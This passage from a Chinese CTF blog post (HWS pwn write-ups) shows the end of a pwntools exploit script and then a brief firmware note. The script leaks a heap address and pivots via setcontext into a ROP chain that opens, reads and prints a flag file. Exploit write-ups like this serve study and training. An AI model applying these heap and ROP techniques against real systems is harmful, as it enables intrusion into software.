heap</span></span><br><span class="line">free()</span><br><span class="line">payload = p64(func_ptr) + p64(<span class="number">0</span>) + p64(<span class="number">0x603340</span>) + p64(<span class="number">8</span>)</span><br><span class="line">note(<span class="number">0x38</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;name :&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">free()</span><br><span class="line">payload = p64(heap + <span class="number">8</span>) + p64(setcontext)</span><br><span class="line">note(<span class="number">0x38</span>,payload)</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(heap+<span class="number">0x70</span>) + p64(pop_rdx) + p64(<span class="number">0x300</span>) + p64(read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x40</span>) + p64(ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">note(<span class="number">0xa8</span>, payload)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x401CA3&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># heap + 0x70</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xffffff9C</span>) + p64(pop_rsi) + p64(heap + <span class="number">0x70</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">257</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(heap) + p64(puts)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="固件部分"><a href="#固件部分" class="headerlink" title="固件部分"></a>固件部分</h1><h2 id="NodeMCU"><a href="#NodeMCU" class="headerlink" title="NodeMCU"></a>NodeMCU</h2><p>签到题，解压出固件后直接cat就有</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/iot/" rel="tag"># iot</a>
+              <a href="/tags/hws/" rel="tag"># hws</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/18/HayyimCTF2022-cooldown/" rel="prev" title="HayyimCTF2022-cooldown">
+      <i class="fa fa-chevron-left"></i> HayyimCTF2022-cooldown
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/17/HWS2023%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B-pwn/" rel="next" title="HWS2023夏令营选拔赛-pwn">
+      HWS2023夏令营选拔赛-pwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN%E9%83%A8%E5%88%86"><span class="nav-number">1.</span> <span class="nav-text">PWN部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#emarm"><span class="nav-number">1.1.</span> <span class="nav-text">emarm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E8%B0%83%E8%AF%95"><span class="nav-number">1.1.1.</span> <span class="nav-text">关于调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E6%9E%B6%E6%9E%84"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">关于架构</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%AD%98%E5%82%A8"><span class="nav-number">1.1.1.1.1.</span> <span class="nav-text">加载和存储</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%8D%E6%8B%93%E5%B1%95"><span class="nav-number">1.1.1.1.2.</span> <span class="nav-text">位拓展</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC"><span class="nav-number">1.1.1.1.3.</span> <span class="nav-text">跳转</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PCS"><span class="nav-number">1.1.1.1.4.</span> <span class="nav-text">PCS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E4%B9%8B%E7%B1%BB%E7%9A%84"><span class="nav-number">1.1.1.1.5.</span> <span class="nav-text">加减乘除之类的</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.2.</span> <span class="nav-text">关于题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Justcode"><span class="nav-number">1.2.</span> <span class="nav-text">Justcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undlcv"><span class="nav-number">1.3.</span> <span class="nav-text">undlcv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vtcpp"><span class="nav-number">1.4.</span> <span class="nav-text">vtcpp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E9%83%A8%E5%88%86"><span class="nav-number">2.</span> <span class="nav-text">固件部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NodeMCU"><span class="nav-number">2.1.</span> <span class="nav-text">NodeMCU</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
